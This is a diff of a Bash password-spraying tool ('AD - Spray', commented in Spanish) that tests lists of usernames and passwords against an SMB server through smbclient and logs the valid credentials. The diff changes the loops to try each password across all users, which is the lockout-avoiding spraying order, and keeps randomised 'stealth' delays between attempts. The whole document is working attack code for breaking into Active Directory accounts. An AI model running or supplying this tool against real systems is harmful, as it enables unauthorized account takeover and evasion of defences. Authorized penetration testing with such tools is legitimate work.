@@ -19,8 +19,8 @@ VALID_CREDENTIALS=0
 VERSION=1.0
 
 function banner(){
-    echo -e "${B}AD - Spray ${NF}"
-    echo -e "${B}Version: ${Y}$VERSION ${NF}\n"
+    echo -e "${M}AD - Spray ${NF}"
+    echo -e "${M}Version: ${Y}$VERSION ${NF}\n"
 }
 
 # Función de uso
@@ -93,7 +93,7 @@ function random_sleep() {
         *) min=11; max=22 ;; # Default (Stealth)
     esac
     local sleep_time=$(shuf -i "$min-$max" -n 1)
-    echo -e "${B}[i]${NF} Esperando $sleep_time segundos antes de continuar..."
+    echo -e "${B}[i]${NF} Esperando $sleep_time segundos antes de continuar... \n"
     sleep "$sleep_time"
 }
 
@@ -142,15 +142,24 @@ function test_credentials() {
     local server=$3
     local domain=$4
 
+    # Ajustar el dominio si es "default"
+    [[ "$domain" == "default" ]] && domain=""
+    
     if smbclient -L "$server" -U "$user%$password" ${domain:+-W "$domain"} &>/dev/null; then
-        echo -e "${G}[!]${NF} Credenciales válidas: $user:$password"
+        echo -e "${G}[!]${NF} Credenciales válidas: $user:$password \n"
         write_log message "[!] Credenciales válidas: $user:$password"
         track_stats valid
         return 0
     else
-        echo -e "${R}[x]${NF} Credenciales no válidas: $user:$password"
+        echo -e "${R}[x]${NF} Credenciales no válidas: $user:$password \n"
         return 1
     fi
+}
+
+# Elimina los retorno de carro de archivos creados en Windows
+function normalize_files() {
+    local file=$1
+    sed -i 's/\r$//' "$file" 2>/dev/null
 }
 
 # Procesa una lista de usuarios y una lista de contraseñas
@@ -160,19 +169,22 @@ function process_users_and_passwords() {
     local server=$3
     local domain=$4
 
-    while IFS= read -r user; do
-        [[ -z "$user" ]] && continue
-        echo -e "${B}[i]${NF} Probando ..."
-        echo -e "   - usuario:$Y $user $NF"
-        while IFS= read -r password; do
-            [[ -z "$password" ]] && continue
-            echo -e "   - contraseña:$Y $password $NF\n"
-#            echo -e "${C}[i]${NF}   Probando contraseña: $password..."
+    normalize_files "$users_file"
+    normalize_files "$passwords_file"
+
+    while IFS= read -r password; do
+        [[ -z "$password" ]] && continue
+        while IFS= read -r user; do
+            [[ -z "$user" ]] && continue
+            echo -e "${B}[i]${NF} Probando ..."
+            echo -e "   - Usuario: $Y$user$NF"
+            echo -e "   - Contraseña: $Y$password$NF\n"
             test_credentials "$user" "$password" "$server" "$domain"
             random_sleep
-        done < "$passwords_file"
-    done < "$users_file"
+        done < "$users_file"
+    done < "$passwords_file"
 }
+
 
 # Procesa un usuario único y una lista de contraseñas
 function process_single_user_and_passwords() {
@@ -181,12 +193,13 @@ function process_single_user_and_passwords() {
     local server=$3
     local domain=$4
 
-    echo -e "${B}[i]${NF} Probando ..."
-    echo -e "   - usuario:$Y $user $NF"
+    normalize_files "$passwords_file"
+    
     while IFS= read -r password; do
         [[ -z "$password" ]] && continue
+        echo -e "${B}[i]${NF} Probando ..."
+        echo -e "   - usuario:$Y $user $NF"
         echo -e "   - contraseña:$Y $password $NF\n"
-#        echo -e "${C}[i]${NF}   Probando contraseña: $password..."
         test_credentials "$user" "$password" "$server" "$domain"
         random_sleep
     done < "$passwords_file"
@@ -198,6 +211,8 @@ function process_users_and_single_password() {
     local password=$2
     local server=$3
     local domain=$4
+
+    normalize_files "$users_file"
 
     while IFS= read -r user; do
         [[ -z "$user" ]] && continue
@@ -226,23 +241,29 @@ function process_single_user_and_password() {
 # Procesar combinaciones
 function process_combination() {
     if [[ -n "$USERS_FILE" && -n "$PASSWORDS_FILE" ]]; then
+        banner
         write_log ini
         process_users_and_passwords "$USERS_FILE" "$PASSWORDS_FILE" "$SERVER" "$DOMAIN"
         write_log fin
     elif [[ -n "$SINGLE_USER" && -n "$PASSWORDS_FILE" ]]; then
+        banner
         write_log ini
         process_single_user_and_passwords "$SINGLE_USER" "$PASSWORDS_FILE" "$SERVER" "$DOMAIN"
         write_log fin
     elif [[ -n "$USERS_FILE" && -n "$SINGLE_PASSWORD" ]]; then
+        banner
         write_log ini
         process_users_and_single_password "$USERS_FILE" "$SINGLE_PASSWORD" "$SERVER" "$DOMAIN"
         write_log fin
     elif [[ -n "$SINGLE_USER" && -n "$SINGLE_PASSWORD" ]]; then
+        banner
         write_log ini
         process_single_user_and_password "$SINGLE_USER" "$SINGLE_PASSWORD" "$SERVER" "$DOMAIN"
         write_log fin
     else
         echo -e "${Y}[!]${NF} Error: Combinación de parámetros no válida."
+        banner
+        usage
         exit 1
     fi
 }
@@ -262,10 +283,6 @@ function report_stats() {
 
 
 # Main
-# Configurar archivo de log
-DOMAIN=${DOMAIN:-"default"}
-LOG_FILE="spray_${DOMAIN}.log"
-
 # Parseo de parámetros
 while getopts "U:u:P:p:s:d:t:" opt; do
     case "$opt" in
@@ -279,6 +296,10 @@ while getopts "U:u:P:p:s:d:t:" opt; do
         *) usage ;;
     esac
 done
+
+# Configurar archivo de log
+DOMAIN=${DOMAIN:-"default"}
+LOG_FILE="spray_${DOMAIN}.log"
 
 validate_parameters
 process_combination
